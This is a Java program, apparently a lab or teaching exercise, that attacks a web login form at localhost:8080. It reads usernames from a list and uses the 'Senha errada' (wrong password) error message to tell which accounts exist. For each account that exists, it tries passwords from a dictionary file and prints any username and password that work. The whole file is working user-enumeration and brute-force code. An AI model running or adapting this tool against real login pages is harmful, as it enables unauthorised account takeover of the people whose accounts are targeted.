package org.enumerador.usuarios;

import java.io.IOException;
import java.io.InputStreamReader;

import org.apache.commons.io.LineIterator;
import org.jsoup.Connection.Method;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

/**
 * Hello world!
 *
 */
public class App {

	private static final Object ENCONTRADO = "Senha errada";
	private static final String LOGIN_URL = "http://localhost:8080/login";;
	private static final String SENHA_ERRADA = "Senha errada";

	public static void main(String[] args) throws IOException {
		App app = new App();
		app.doTesting();
	}

	public void doTesting() throws IOException {
		
		InputStreamReader usernames = new InputStreamReader(
				this.getClass().getClassLoader().getResourceAsStream("usernames.db.txt"));

		LineIterator it = new LineIterator(usernames);

		it.forEachRemaining((usuario) -> testUsuario(usuario));

		usernames.close();
	}

	private void testUsuario(String usuario) {

		Document doc;

		doc = postLogin(usuario, "abcd123**");

		String resultado = textoErroDiv(doc);

		if (ENCONTRADO.equals(resultado)) {
			testarSenhas(usuario);
		}

	}

	private String textoErroDiv(Document doc) {
		return doc.select("#erroDiv").text();
	}

	private Document postLogin(String usuario,  String senha)  {
		try {
			return Jsoup.connect(LOGIN_URL)
				.data("usuario", usuario)
				.data("senha", senha)
				.method(Method.POST)
				.timeout(0)
				.post();
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
	}

	private void testarSenhas(String usuario) {
		InputStreamReader passwords = new InputStreamReader(
				this.getClass().getClassLoader().getResourceAsStream("passwords.db.txt"));

		LineIterator it = new LineIterator(passwords);

		while (it.hasNext()) {
			String senha = it.next();
			boolean deuCerto = !SENHA_ERRADA.equals(textoErroDiv(postLogin(usuario, senha)));
			if (deuCerto) {
				System.out.println(String.format("usuario %s senha %s", usuario, senha));
				return;
			}
		}
	}
}
